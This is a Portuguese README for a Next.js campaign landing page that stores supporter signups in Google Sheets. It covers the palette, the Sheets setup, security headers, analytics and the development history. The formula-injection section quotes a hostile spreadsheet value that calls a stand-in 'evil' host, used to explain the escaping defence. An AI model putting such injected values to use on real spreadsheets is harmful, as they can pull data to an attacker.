# LP Matheus Biancardine 3055

Landing page de captação de apoiadores. Réplica estrutural de
`https://mg-campaign-hub.lovable.app/` (site do próprio cliente), reconstruída em Next.js com a
paleta da identidade visual oficial e com formulário funcional.

## Stack

| Peça | Versão | Nota |
|---|---|---|
| Node | 22 LTS (>= 20.9) | 24 LTS também serve |
| pnpm | 11.x | gerenciador do projeto — **não use npm/yarn** |
| Next.js | 16.3.4 | App Router + Turbopack |
| React | 19.2.8 | |
| TypeScript | **6.0.3 (pinado)** | ver aviso abaixo |
| Tailwind | 4.3.3 | `@theme inline`, sem `tailwind.config.js` |
| shadcn/ui | radix-nova | `components.json` na raiz |
| zod | 4.5.4 | **só no servidor** — ver `src/lib/lead-schema.ts` |
| google-auth-library | 11.0.2 | só o JWT; **sem** o pacote `googleapis` (~50 MB) |

### ⚠️ TypeScript está pinado em 6.0.3 de propósito

`typescript@7.x` passou a distribuir apenas o compilador nativo em Go e **removeu
`lib/typescript.js`** (a Compiler API em JavaScript). O Next.js detecta o TypeScript exigindo esse
arquivo, então com TS 7 o build falha com "typescript não instalado" mesmo estando instalado.
6.0.3 é a última linha que ainda expõe a API JS. Revisitar quando a API programática voltar (TS 7.1).

## Comandos

```bash
pnpm dev              # servidor de desenvolvimento
pnpm build            # build de produção
pnpm typecheck        # tsc --noEmit
pnpm lint             # eslint
pnpm test             # vitest (unitários)
pnpm gen:cities       # regenera src/data/mg-cities.ts a partir do IBGE
pnpm setup:google <chave.json> [--sheet-url URL]   # preenche as vars do Google no .env.local
pnpm check:contrast   # valida os pares de contraste WCAG da paleta
```

## Identidade visual

Fonte da verdade: **`Manual de marca - campanha Matheus Biancardine.pdf`**.

> Existe um PDF anterior, `IDENTIDADE VISUAL MATHEUS BIANCARDINE.pdf`, de **pré-campanha**
> (navy `#012E40`, verde `#29EA28`). Ele **não vale mais**. O manual de campanha o substitui, e
> foi ele que o site de referência da Lovable já usava desde o início.

### Paleta — as seis cores do manual

| Cor | Hex | Papel na UI |
|---|---|---|
| Navy | `#052E3F` | `--background` |
| Teal | `#03748C` | `--secondary` — **só superfície, nunca texto** (2.6:1 sobre o navy) |
| Lima | `#63B32F` | disponível como `bg-brand-lima`; aparece na logo colorida |
| Verde | `#1CA638` | disponível como `bg-brand-green` |
| Laranja | `#EC671B` | `--primary` e `--ring` — CTA, preenchimento, foco |
| Amarelo | `#FDC730` | `--accent` — badges (9.1:1) |

Superfícies derivadas (`--ink`, `--card`, `--border`, `--muted`…) usam a mesma escala do site de
referência, que já foi desenhada em cima destas seis cores.

### O laranja do manual não serve para texto pequeno

`#EC671B` é ótimo em preenchimento e ruim em texto pequeno:

| sobre | contraste | veredito |
|---|---|---|
| `--background` `#052E3F` | 4.44:1 | reprova em AA (exige 4.5) por um triz |
| `--card` `#073B4F` | **3.73:1** | reprova com folga — e é onde ficam a numeração dos cards e o badge |
| `--ink` `#042735` | 4.84:1 | passa |

Daí dois tokens, e a regra de uso é simples:

- **`--primary` (`#EC671B`, a cor exata do manual)** — preenchimento, botão, anel de foco e
  **texto grande**: o `<h1>` e os números das estatísticas (24px+).
- **`--primary-text` (`#FF771F`)** — **texto pequeno** sobre superfície escura: kickers, badge
  "acesso gratuito", numeração `01`–`04`, links. É 15% mais claro, o mínimo que passa nas três
  superfícies, e a diferença é imperceptível nos tamanhos em que aparece (11–14px).

Duas consequências que não podem ser desfeitas por engano:

- **`--primary-foreground` é o `--ink` `#042735`, não o navy do fundo.** Ink sobre o laranja dá
  4.84:1; o navy daria 4.44:1 e reprovaria. O botão CTA é texto quase-preto sobre laranja.
- **`pnpm check:contrast` é o guarda** — 21 pares, incluindo os três de `--primary-text`.

### Logos

`src/assets/PNG/` guarda as 9 variações oficiais em 1080×1350 (36% do canvas é transparência).
As usadas no site foram recortadas e reduzidas para `src/assets/logo/`:

| Arquivo | Origem | Onde |
|---|---|---|
| `matheus-3055-cor.png` | `LOGO MATHEUS 6` | menu lateral e modal de sucesso |
| `matheus-3055-branco.png` | `LOGO MATHEUS 9` | rodapé |

A variante colorida foi escolhida porque o laranja dela é o mesmo do `--primary` e o verde-lima
é o `#63B32F` do manual. As variações `01`, `04` e `08` têm "MATHEUS" em tom escuro — são para
fundo claro e ficam ilegíveis no navy.

O **hero mantém o "3055" tipográfico gigante**, que é a assinatura do site de referência; a logo
oficial entra só onde não duplicaria essa informação.

### Tipografia

Hoje: **Neo Sans Std** no display, **Barlow** no texto corrido. Os `.otf` originais estão em
`src/fonts/`; o site carrega `.woff2` com subset latin (~15 KB por peso em vez de ~70 KB).
Comando de regeneração em `src/fonts/README.md`. Só 4 pesos (400/500/700/900), sem itálico.

> ⚠️ **Divergência em aberto.** O manual de campanha especifica **AMSI PRO**, não Neo Sans — o
> Neo Sans veio do PDF de pré-campanha. Trocar depende de alguém fornecer os arquivos da AMSI Pro
> (também comercial, da Stawix). Enquanto isso o site segue em Neo Sans.

Tokens e animações ficam em `src/app/globals.css`. Os keyframes `cta-pulse`, `cta-blink`,
`marquee-x` e `rise-in` reproduzem os do site de referência e estão todos dentro de
`@media (prefers-reduced-motion: no-preference)`.

## Convenções

- **Server Components por padrão.** `"use client"` só onde há estado/evento: formulário,
  combobox de cidades, drawer, modal de sucesso.
- **Cores só por token semântico** (`bg-primary`, `text-muted-foreground`). Nunca hex solto
  nem `bg-green-500`.
- **Espaçamento com `gap-*`**, nunca `space-x-*`/`space-y-*`. `size-*` quando largura = altura.
- **Formulários com `Field`/`FieldGroup`** do shadcn; `data-invalid` no `Field` e `aria-invalid`
  no controle.
- **Ícones importados um a um** do `lucide-react` (nunca barrel import). Ícones de marca ficam em
  `src/components/icons/social.tsx` (simple-icons, CC0) porque o lucide 1.x removeu os brand icons.
- **Nada de PII em log.** Erros de servidor logam código e contexto, nunca nome/telefone.

## Onde mexer em quê

| Quero… | Arquivo |
|---|---|
| Colocar os links das redes sociais | `src/config/social.ts` |
| Mudar textos legais, CNPJ, links do Linktree/Vakinha | `src/config/site.ts` |
| Mudar cores | `src/app/globals.css` (`:root`) |
| Trocar pesos/fontes | `src/lib/fonts.ts` + `src/fonts/README.md` |
| Configurar a planilha do Google | `pnpm setup:google` (ver seção abaixo) |
| Mudar regras de validação | `src/lib/validation.ts` |
| Mexer na gravação da planilha | `src/lib/sheets.ts` + `src/actions/submit-lead.ts` |

## Configuração da planilha do Google

Os quatro valores do `.env.local` saem de **dois lugares**: um arquivo JSON que o Google gera, e a
URL da própria planilha.

### 1. Criar a conta de serviço e baixar o JSON

1. [console.cloud.google.com](https://console.cloud.google.com) → criar (ou escolher) um projeto.
2. **APIs e serviços › Biblioteca** → procurar **Google Sheets API** → **Ativar**.
3. **APIs e serviços › Credenciais** → **Criar credenciais** → **Conta de serviço**.
   Nome livre (ex.: `lp-cadastro`), pode pular as etapas de permissão.
4. Abrir a conta criada → aba **Chaves** → **Adicionar chave › Criar nova chave › JSON**.
   O navegador baixa algo como `meu-projeto-a1b2c3.json`. **Esse arquivo é a credencial** —
   não vai para o git, não vai para o WhatsApp.

### 2. Deixar o script preencher o `.env.local`

```bash
pnpm setup:google ~/Downloads/meu-projeto-a1b2c3.json \
  --sheet-url "https://docs.google.com/spreadsheets/d/COLE_A_URL_DA_PLANILHA/edit"
```

Ele lê `client_email` e `private_key` do JSON, extrai o ID da URL da planilha e grava as três
variáveis já escapadas, deixando o arquivo com permissão `600`.

Fazer isso à mão dá errado com frequência: a `private_key` tem ~1700 caracteres e várias quebras
de linha que precisam virar `\n` literais. Errando o escape, o sintoma é um
`DECODER routines::unsupported` do OpenSSL só na hora de gravar o primeiro cadastro.

### 3. Compartilhar a planilha com a conta de serviço

**É o passo que mais se esquece.** A conta de serviço é um usuário do Google como outro qualquer:
sem acesso explícito, a API responde **403** mesmo com as credenciais corretas.

Na planilha → **Compartilhar** → colar o `GOOGLE_SERVICE_ACCOUNT_EMAIL`
(algo como `lp-cadastro@meu-projeto.iam.gserviceaccount.com`) → papel **Editor** → Enviar.

### 4. Preparar a aba

Criar a aba com o nome de `GOOGLE_SHEET_TAB` (padrão `Leads`) e, na linha 1, os cabeçalhos:

```
timestamp | nome | cidade | celular | consentimento | origem
```

### 5. Conferir

```bash
pnpm dev    # preencher o formulário e ver a linha aparecer na planilha
```

### De onde vem cada variável

| Variável | Origem |
|---|---|
| `GOOGLE_SERVICE_ACCOUNT_EMAIL` | campo `client_email` do JSON |
| `GOOGLE_PRIVATE_KEY` | campo `private_key` do JSON |
| `GOOGLE_SHEET_ID` | URL da planilha, entre `/d/` e `/edit` |
| `GOOGLE_SHEET_TAB` | você escolhe; precisa bater com o nome da aba |
| `FORM_HMAC_SECRET` | você gera: `openssl rand -hex 32` |
| `NEXT_PUBLIC_SITE_URL` | domínio final do site (usado em canonical/OG) |

### Em produção

As mesmas variáveis vão no painel do provedor (Vercel: Settings › Environment Variables).
A `GOOGLE_PRIVATE_KEY` pode ser colada com as quebras de linha reais — `env.ts` aceita as três
formas (com `\n` escapado, com quebras reais, ou o PEM inteiro em base64).

## Skills e agentes usados no desenvolvimento

`.agents/` e `.claude/` **não são versionados** (estão no `.gitignore`), então fica aqui o
registro do que foi usado, para a próxima pessoa saber o que reinstalar se quiser reproduzir
o ambiente.

### Skills

Instaladas via `npx skills` (manifesto em `skills-lock.json`, este sim versionado):

| Skill | Origem | Onde pesou |
|---|---|---|
| `shadcn` | `shadcn-ui/ui` | Convenções de composição: `Field`/`FieldGroup` no formulário, `gap-*` em vez de `space-y-*`, `size-*`, `data-invalid` + `aria-invalid`, cor só por token semântico. Também o `init` e o `add` pela CLI. |
| `vercel-react-best-practices` | `vercel-labs/agent-skills` | Regras de performance da Onda 3: `bundle-barrel-imports` (ícones um a um), `bundle-conditional` (as 853 cidades por `import()`), `bundle-dynamic-imports` (Dialog e Sheet), Server Components por padrão. |
| `ui-ux-pro-max` | `nextlevelbuilder/ui-ux-pro-max-skill` | Base de dados de tipografia, consultada para achar a substituta livre do Neo Sans antes de os arquivos originais chegarem. |
| `web-design-guidelines` | `vercel-labs/agent-skills` | Checklist da auditoria de acessibilidade (alvos de toque, foco visível, `prefers-reduced-motion`, landmarks). |

Instaladas e **não usadas** neste projeto: `domain-modeling`, `frontend-design`, `grilling`,
`grill-me`, `grill-with-docs`.

### Agentes

| Onda | Agentes | Resultado |
|---|---|---|
| 0 — fundação | nenhum (sequencial) | Scaffold, tokens, fontes e configs. Tudo o mais depende disso. |
| 1 — construção | **3 em paralelo**: domínio do formulário · seções estáticas · backend | Concluídos. Sem dependência entre si, por isso o paralelo. |
| 2 — integração | nenhum (sequencial) | Junção das três frentes, metadados, headers. |
| 3 — auditoria | 2 em paralelo: UI/a11y · performance/SEO | **Os dois morreram por limite de sessão da API antes de editar qualquer arquivo.** A auditoria foi refeita à mão — os achados da Onda 3 acima são todos dela. |

### Ferramentas de verificação

Nenhuma virou dependência do projeto; foram usadas em scripts descartáveis fora do repositório.

- **Chrome headless via CDP** (WebSocket direto, sem Puppeteer) — mediu LCP/CLS, dirigiu o
  formulário de ponta a ponta, conferiu contraste, alvos de toque e ordem de foco, e validou
  o carregamento das tags de medição.
- **PyMuPDF** — extraiu a paleta e a tipografia do PDF da identidade visual.
- **fontTools / pyftsubset** — converteu os `.otf` do Neo Sans para `.woff2` com subset latin.

## Changelog do desenvolvimento

### Onda 0 — fundação
- Scaffold Next 16.3.4 + React 19 + Tailwind v4 + App Router + `src/` + alias `@/`.
- TypeScript pinado em 6.0.3 (motivo acima).
- `shadcn init` (base radix, preset nova) + componentes `button dialog sheet input label field
  checkbox badge separator sonner`.
- `src/app/globals.css` reescrito com os tokens da identidade visual e os 4 keyframes da referência.
- `src/lib/fonts.ts` — inicialmente com Exo 2 como substituta; trocado para Neo Sans Std
  na Onda 4, quando os arquivos chegaram.
- `src/config/site.ts` (textos, legais, Linktree, Vakinha) e `src/config/social.ts`
  (placeholders de link das redes).
- `src/components/icons/social.tsx` gerado a partir do simple-icons.
- Imagens copiadas para `src/assets/` (os originais na raiz continuam intactos).

### Onda 1 — domínio, seções e servidor (3 agentes em paralelo)

**Formulário (domínio)**
- `scripts/generate-mg-cities.mts` → `src/data/mg-cities.ts` com os **853 municípios de MG**.
  Tenta IBGE, cai para `kelvins/municipios-brasileiros` e depois BrasilAPI.
- `src/lib/validation.ts` — `leadSchema` (zod) + `firstError()`, que percorre
  `FIELD_ORDER` e devolve **um erro por vez**. Mesma função roda no cliente e no servidor.
- `src/lib/phone.ts` — máscara progressiva, `VALID_DDDS`, `isValidMobile` (11 dígitos,
  DDD real, nono dígito `9`, rejeita repetidos).
- `src/lib/normalize.ts` — `foldAccents`, `collapseSpaces`, `titleCaseName`.
- `src/components/city-combobox.tsx` — combobox ARIA, lista carregada por `import()`
  no primeiro foco, prefixo antes de substring, máximo 8 sugestões, destaque em `<mark>`.

**Seções** — `src/components/sections/*` (9 Server Components) replicando a referência
com os tokens novos.

**Servidor**
- `src/lib/env.ts` (validação preguiçosa das env vars), `rate-limit.ts` (LRU em memória,
  5 envios / 10 min por IP), `form-token.ts` (HMAC-SHA256, `timingSafeEqual`),
  `sheets.ts` (JWT + `fetch` direto na Sheets API v4; **sem** o pacote `googleapis`).
- `src/actions/submit-lead.ts` — honeypot → token → rate limit → validação → gravação.
- `src/app/privacidade/page.tsx` — política LGPD.

### Onda 2 — integração
- `src/components/signup-form.tsx` — ilha cliente única. `useActionState`, validação
  sequencial com foco no primeiro campo inválido, máscara de telefone **preservando a
  posição do cursor**, honeypot `empresa` posicionado fora da viewport.
- `src/components/success-dialog.tsx` — modal com Linktree e vakinha.
- `src/components/social-drawer.tsx` + `social-rail.tsx` — menu lateral e barra fixa.
- `src/app/page.tsx`, `layout.tsx`, `sitemap.ts`, `robots.ts`, `opengraph-image.tsx`,
  `structured-data.tsx` (JSON-LD Person + WebSite).
- `src/app/api/form-token/route.ts` — única rota dinâmica do site. Existe porque a página
  é estática: um token gerado no build já nasceria vencido.
- `next.config.ts` — CSP, HSTS, `X-Frame-Options`, `Permissions-Policy`, `Referrer-Policy`.

### Onda 3 — auditoria de performance, SEO e acessibilidade

Feita manualmente com Chrome headless via CDP (os dois subagentes de auditoria morreram por
limite de sessão). Scripts de medição ficaram no scratchpad, fora do repositório.

**Performance — o que mudou**

| | antes | depois |
|---|---|---|
| JS transferido | 188,6 KB | **164,7 KB** |
| Fontes | 165,3 KB | **124,4 KB** |
| Total da página | 437,5 KB | **346,7 KB** |
| LCP (4× CPU, 9 Mbps) | 452 ms | **412 ms** |
| CLS | 0 | **0** |

1. **zod saiu do bundle do cliente.** `src/lib/validation.ts` era importado pelo formulário e
   arrastava o zod inteiro com todos os locales (~50 KB gzip; dava para ler "Ungültige Eingabe"
   no chunk). As regras viraram funções puras ali, e o schema zod — que só o servidor usa para
   parsear e normalizar — foi para `src/lib/lead-schema.ts`, construído em cima das mesmas
   funções. Regra única, dois consumidores, zod só no servidor.
2. **`latin-ext` removido das fontes.** Português inteiro cabe em U+00FF, então metade dos
   arquivos do Barlow era peso morto.
3. **Dialog e Sheet viraram `next/dynamic`.** Nenhum dos dois é necessário para ler a página;
   agora só baixam quando alguém abre o menu ou conclui o cadastro. O hambúrguer pré-carrega o
   painel no hover/foco, então o clique já encontra o chunk pronto.
4. **`sonner` e `next-themes` desinstalados.** O `<Toaster />` estava montado no layout mas
   `toast()` nunca era chamado — os erros do formulário sempre foram inline, que é melhor para
   leitor de tela. Eram 11 KB de nada.
5. **`react-hook-form` e `@hookform/resolvers` desinstalados** — nunca chegaram a ser usados.
6. `src/data/mg-cities.ts` confirmado **fora** do bundle inicial (só carrega no foco do campo).

**Acessibilidade — o que estava quebrado**

1. **Skip link focável e invisível.** `sr-only focus:not-sr-only` não resetava o
   `clip-path: inset(50%)`, então o link existia na ordem de tabulação mas nunca aparecia — o
   pior dos mundos. Virou a classe `.skip-link` escrita à mão em `globals.css`. Agora mede
   258×48 e é o primeiro Tab da página.
2. **Checkbox de consentimento não respondia ao rótulo.** O primitivo do Radix renderiza um
   `<button role="checkbox">`, e `<label for>` não aciona um button — só o quadradinho de 20×20
   funcionava, abaixo dos 24×24 da WCAG 2.5.8. Trocado por `<input type="checkbox">` nativo
   estilizado: o rótulo inteiro (276×78) virou alvo, Espaço alterna, e o navegador não repassa
   o clique quando ele nasce no link interno da Política de Privacidade. De quebra saiu o
   Radix Checkbox do bundle.
3. **Link "Política de Privacidade" do rodapé com 137×20.** Não está dentro de uma frase, então
   não vale a exceção de alvo inline. Ganhou padding: 153×32.
4. **Foco não voltava ao hambúrguer** ao fechar o menu. O Radix restaura para quem estava
   focado na abertura, que nem sempre é o botão. Agora é explícito.
5. **`invalid` chegando no DOM.** `fieldProps` espalhava `invalid` em `<input>` nativo e o React
   reclamava a cada render. Agora só devolve atributos ARIA.
6. **"3055" cobrindo o kicker e o nome.** `leading-[0.82]` deixa a caixa de linha menor que os
   glifos; as ascendentes do Neo Sans transbordam ~9,5% do tamanho da fonte (o Archivo do site
   de referência não transbordava). Compensado com `pt-[0.1em] pb-[0.07em]`, que escala junto
   com a fonte em todos os breakpoints.
7. **`GOOGLE_PRIVATE_KEY` placeholder passava na validação.** O texto do `.env.example` tem
   `-----BEGIN PRIVATE KEY-----`, então o app se dava por configurado e só quebrava no
   `DECODER routines::unsupported` do OpenSSL na hora de gravar. `env.ts` agora exige corpo PEM
   de 500+ caracteres e diz explicitamente que parece o placeholder.

**Verificado e OK, sem necessidade de mudança**

- Zero scroll horizontal em 320/375/768/1024/1440 px; zoom 200% sem perda.
- Todas as animações silenciam com `prefers-reduced-motion: reduce`.
- 4 imagens, todas com `alt` descritivo. CLS 0,0000.
- Combobox 100% por teclado: ↑↓ navegam, Enter seleciona, Escape fecha, `aria-activedescendant`
  acompanha. Menu lateral abre no Enter, prende o foco e fecha no Escape.
- Um único `<h1>`; landmarks `header`/`main`/`footer`/`nav`/`aside` corretos.
- `pnpm check:contrast` — 17/17 pares.

### Onda 4 — fontes reais e configuração do Google

- **Neo Sans Std entrou no lugar do Exo 2.** Os 12 `.otf` fornecidos (6 pesos × romano/itálico)
  ficam em `src/fonts/`. O site carrega 4 `.woff2` com subset latin gerados deles —
  **~15 KB por peso em vez de ~70 KB** (78% menor). Nenhum itálico entra: o layout não usa.
  `font-black` (24 usos, o peso dominante) mapeia para **Black**, não Ultra — Black é o que mais
  se aproxima do peso do Archivo Black do site de referência; Ultra ficaria mais pesado que o
  original. Comando de regeneração em `src/fonts/README.md`.
- **`pnpm setup:google`** (`scripts/setup-google-env.mts`) preenche `GOOGLE_SERVICE_ACCOUNT_EMAIL`,
  `GOOGLE_PRIVATE_KEY` e `GOOGLE_SHEET_ID` a partir do JSON da service account, escapando os `\n`
  e travando o `.env.local` em `600`. Existe porque o escape manual da chave falha com frequência
  e o erro só aparece no primeiro cadastro.
- **`src/lib/env.test.ts`** — 11 testes cobrindo as três formas de PEM aceitas, a recusa do
  placeholder do `.env.example` (regressão da Onda 3) e a garantia de que nenhum valor de
  variável vaza na mensagem de erro. Suíte: **100 testes**.

### Onda 6 — manual de marca da campanha

- **Paleta trocada para o manual de campanha** (`#052E3F` `#03748C` `#63B32F` `#1CA638`
  `#EC671B` `#FDC730`), que substitui o PDF de pré-campanha. É a mesma paleta que o site de
  referência já usava — as cores originais dele estavam certas o tempo todo.
- **`--primary-text` criado** porque o laranja do manual reprova como texto pequeno (3.73:1
  sobre o card). ~30 ocorrências de `text-primary` em texto pequeno migraram; preenchimentos,
  ícones e texto grande continuam em `--primary`.
- **`--primary-foreground` virou `--ink`** para o botão CTA passar em AA (4.84:1).
- **`--control-border` subiu para `#4A93AC`**: o card ficou mais claro nesta paleta e o valor
  antigo caiu para 2.89:1, abaixo dos 3:1 da WCAG 1.4.11.
- **`--destructive` clareado para `#FF7B7B`** — o anterior dava 4.33:1 dentro do card, onde os
  erros de validação aparecem. Par novo no `check:contrast`, que foi de 17 para 21 pares.
- **Logos oficiais** em `src/assets/logo/`, no rodapé, no menu lateral e no modal de sucesso.

### Onda 5 — tags de medição e redes sociais

- **Google Tag Manager (`GTM-M498JLMC`) e Meta Pixel (`1059089453243567`)** em
  `src/components/analytics.tsx`, com `next/script` e `strategy="afterInteractive"`. Os dois
  `<noscript>` (iframe do GTM e img 1×1 do Meta) ficam logo após a abertura do `<body>`, como os
  fornecedores exigem. Os IDs vivem em `src/config/analytics.ts`; **esvaziar um ID desliga a
  ferramenta por completo** — nenhum script, nenhum noscript, e a CSP fecha junto.
- **`LinkedInIcon` e `ThreadsIcon`** somados a `src/components/icons/social.tsx` (paths oficiais
  do simple-icons, CC0). Redes ativas: Instagram, LinkedIn, X e Threads.
- Redes ainda sem conta ficam em `social.ts` com `href: ""` em vez de comentadas — mesmo efeito
  na tela (não renderizam), mas sem import órfão quebrando o build na hora de reativar.

## Decisões que valem registrar

**CSP estática, sem nonce.** O padrão com nonce obriga o Next a renderizar tudo
dinamicamente. A página é 100% estática e não renderiza nada vindo do usuário (os dados do
formulário só saem, nunca voltam para o HTML), então `'unsafe-inline'` em `script-src` custa
pouco e mantém a página no CDN. Tudo o mais fica fechado. Racional completo em `next.config.ts`.

**`--control-border: #3C859F`.** A WCAG 2.1 §1.4.11 exige 3:1 para o contorno de
componentes de interface. O `--border` do site (1.4–1.9:1) é discreto de propósito e serve
para bordas decorativas, que a norma não cobre. Campos de formulário ganharam um token
próprio. **É a única divergência visual deliberada em relação ao site de referência.**
`pnpm check:contrast` guarda os 17 pares.

**Sem credenciais do Google, produção falha alto.** Em desenvolvimento a action responde
sucesso mesmo sem gravar, para dar para trabalhar antes de a planilha existir. Em produção
isso seria perder cadastro em silêncio — o pior desfecho para uma landing de captação —
então lá ela devolve erro e loga.

**Anti-injeção de fórmula.** Todo valor que vai para a planilha passa por
`escapeSheetValue`: começando com `= + - @ \t \r`, ganha um apóstrofo na frente. Sem isso um
nome como `=IMPORTXML("http://evil","//x")` viraria fórmula viva na planilha.

**`frame-src` deixou de ser `'none'`.** O `<noscript>` do GTM é um iframe, então a diretiva
passou a liberar `googletagmanager.com`. `frame-ancestors 'none'` continua valendo — a mudança
é sobre o que *nós* embutimos, não sobre quem pode nos embutir.

**Medição sem banner de consentimento.** O GTM e o Meta Pixel disparam no carregamento, sem
pedir nada. A política de privacidade declara os dois, apoia o tratamento no legítimo interesse
(art. 7º, IX) e explica como recusar pelo navegador — que é a leitura corrente para medição de
audiência no Brasil, e o que a maioria das campanhas faz. **Não é risco zero:** a ANPD vem
sinalizando preferência por consentimento prévio para cookies de publicidade, e o Meta Pixel é
publicidade. Se isso for endurecido, o caminho já está pronto: `src/config/analytics.ts` é o
único ponto de liga/desliga, então um banner só precisa condicionar o render de
`<AnalyticsScripts />`. **Decisão do cliente, registrada aqui para não virar surpresa.**

**Os dados do formulário não vão para as tags.** Nome, cidade e celular saem só para a planilha.
Nenhum `fbq('track', ...)` recebe PII, e não há evento de conversão amarrado ao envio — se um dia
alguém quiser medir cadastro como conversão, mandar um evento **sem** os campos do formulário.

**`FORM_HMAC_SECRET` ausente não derruba o site**, mas o token passa a usar um segredo
aleatório por processo — ele não sobrevive a restart nem vale entre instâncias em
serverless, e o apoiador vê "recarregue a página". Configure a variável em produção.

## Verificação já feita

- `pnpm build` limpo; só `/api/form-token` é dinâmica, todo o resto é estático.
- `pnpm test` — 100 testes passando. `pnpm typecheck` e `pnpm lint` limpos.
- `pnpm check:contrast` — 17/17 pares.
- Fluxo completo dirigido por Chrome headless (CDP), confirmando:
  vazio → pede nome · "Joao" → "Digite seu nome e sobrenome." · só nome → pede cidade ·
  `sao joa` → 8 municípios de MG acentuados · `Campinas` (SP) → rejeitada ·
  `31983626852` → `(31) 98362-6852` · fixo `1133334444` → rejeitado ·
  sem checkbox → pede consentimento · tudo válido → modal com Linktree e vakinha ·
  foco indo para o campo certo em cada passo · honeypot → sucesso falso sem gravar ·
  produção sem credenciais → erro visível.
- Tags de medição conferidas em servidor de produção com Chrome via CDP: `gtm.js` e
  `fbevents.js` carregam, `google_tag_manager` registra o container `GTM-M498JLMC`,
  `fbq.loaded === true` (v2.9.393), o Meta valida o pixel em `signals/config/1059089453243567`
  e o container puxa um GA4 (`G-7M6J5G4SVR`). **Zero violação de CSP e zero erro de console.**
  Os beacons de conversão (`facebook.com/tr`, `google-analytics.com/g/collect`) não saem em
  `localhost` — os dois fornecedores só disparam em domínio registrado. `fetch` direto para os
  dois endpoints passa pela CSP, então isso é característica do ambiente, não do código:
  confirmar no domínio real com o Meta Pixel Helper e o modo Visualizar do GTM.

<!-- BEGIN:nextjs-agent-rules -->

# This is NOT the Next.js you know

This version has breaking changes — APIs, conventions, and file structure may all differ from your training data. Read the relevant guide in `node_modules/next/dist/docs/` (resolved from this file's directory; in monorepos the `next` package may not be visible from the repo root) before writing any code. Heed deprecation notices.

This block is written and re-added by `next dev` — verify at `node_modules/next/dist/server/lib/generate-agent-files.js`. Removing it from a diff only re-creates the uncommitted change; committing it with your work keeps the tree clean.

<!-- END:nextjs-agent-rules -->
